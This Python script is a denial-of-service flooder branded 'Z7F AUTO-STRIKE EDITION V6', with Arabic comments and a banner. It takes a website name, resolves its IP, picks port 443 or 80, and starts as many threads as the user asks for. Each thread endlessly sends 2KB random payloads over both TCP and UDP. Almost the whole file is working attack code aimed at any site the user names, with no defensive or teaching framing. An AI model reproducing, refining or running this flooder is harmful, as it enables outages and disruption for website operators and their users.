import socket
import threading
import random
import os
import sys
import time

# ألوان Z7F
R, G, Y, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

def logo():
    os.system('clear')
    print(f"""
{R}  _______ ______ ______        {W}   _    _  _____  ____  
{R} |__   __|____  |  ____|      {W}  / \  | ||_   _|/ __ \ 
{R}    | |     / /| |__         {W} / _ \ | |  | | | |  | |
{R}    | |    / / |  __|       {W}/ ___ \| |  | | | |__| |
{R}    | |   / /  | |         {W}/_/   \_\_|  |_|  \____/ 
{R}    |_|  /_/   |_| {W}Z7F    {G}  AUTO-STRIKE EDITION V6
{C}=========================================================
{Y}     JUST ENTER SITE & COUNT | LEAVE THE REST TO Z7F
{G}     SPEED: MAX (0.5) | MODE: HYBRID AUTO-SCAN
{C}========================================================={W}""")

payload = random._urandom(2048) # حزمة بيانات ثقيلة 2KB

def smart_attack(ip, port):
    while True:
        try:
            # هجوم هجين (TCP)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            s.send(payload)
            # هجوم هجين (UDP) في نفس اللحظة
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.sendto(payload, (ip, port))
        except:
            pass

def launch():
    logo()
    target = input(f"{G}Enter Website Name (e.g google.com): {W}").replace('http://','').replace('https://','').split('/')[0]
    
    try:
        ip = socket.gethostbyname(target)
        print(f"\n{C}[+] Target IP Found: {W}{ip}")
        
        # كشف البورت التلقائي
        print(f"{Y}[*] Auto-Scanning Port...{W}")
        port = 443
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((ip, 443)) != 0:
            port = 80
        print(f"{C}[+] Smart Port Selection: {W}{port}")

        count = int(input(f"{G}Enter Attack Power (Count): {W}") or 1000)
        
        print(f"\n{R}[!!!] Z7F ATTACK STARTED ON {target} [!!!]{W}")
        print(f"{Y}[*] Mode: Hybrid (TCP/UDP) | Speed: Ultra Fast{W}")

        for i in range(count):
            t = threading.Thread(target=smart_attack, args=(ip, port))
            t.daemon = True
            t.start()
            if i % 100 == 0:
                print(f"{C}[#] Powering Engine {i}...")

        print(f"\n{G}[READY] ALL ENGINES ARE HITTING THE TARGET!{W}")
        while True: time.sleep(1)

    except Exception as e:
        print(f"{R}[-] Error: {e}{W}")

if __name__ == "__main__":
    try: launch()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopped.{W}")
        sys.exit()
